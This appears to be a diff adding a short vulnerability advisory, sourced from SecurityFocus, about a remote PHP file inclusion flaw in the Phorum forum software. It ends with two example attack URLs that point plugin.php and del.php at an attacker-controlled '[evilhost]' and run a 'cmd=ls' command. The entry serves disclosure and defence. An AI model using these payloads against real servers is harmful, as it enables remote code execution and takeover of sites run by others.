@@ -1,0 +1,11 @@
+source: http://www.securityfocus.com/bid/4763/info
+
+Phorum is a PHP based web forums package designed for most UNIX variants, Linux, and Microsoft Windows operating systems.
+
+A vulnerability has been reported in Phorum that will allow remote attackers to specify external PHP scripts and potentially execute commands.
+
+The vulnerability exists in 'plugin.php','admin.php' and 'del.php' files found in the distribution of Phorum. It is possible for a malicious attacker to specify the location of a parameter to the vulnerable PHP files by passing an argument via URL to the PHP files. 
+
+http://[target]/phorum/plugin/replace/plugin.php?PHORUM[settings_dir]=http://[evilhost]&cmd=ls
+
+http://[vulnerablehost]/phorum/admin/actions/del.php?include_path=http://[evilhost]&cmd=ls 
